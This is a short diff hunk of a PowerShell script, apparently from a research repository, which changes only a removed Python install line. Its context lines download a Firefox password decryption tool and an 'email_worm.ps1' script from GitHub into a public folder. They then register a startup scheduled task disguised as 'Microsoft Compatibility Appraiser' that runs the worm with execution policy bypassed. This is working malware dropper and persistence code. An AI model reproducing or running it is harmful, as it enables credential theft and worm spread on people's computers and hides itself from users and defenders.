@@ -152,8 +152,7 @@ mkdir "C:\Users\Public\Public Display"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/firepwd.py' -OutFile "C:\Users\Public\Public Display\firepwd.py"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/requirements.txt' -OutFile "C:\Users\Public\Public Display\requirements.txt"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/email_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
-# install python
-winget install --id 9PNRBTZXMB4Z --source msstore --accept-package-agreements --accept-source-agreements 
+
 
 schtasks /create /tn "Microsoft Compatibility Appraiser" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\Public\Public Display\email_worm.ps1\'" /sc onstart /delay 0001:00 /f 
 
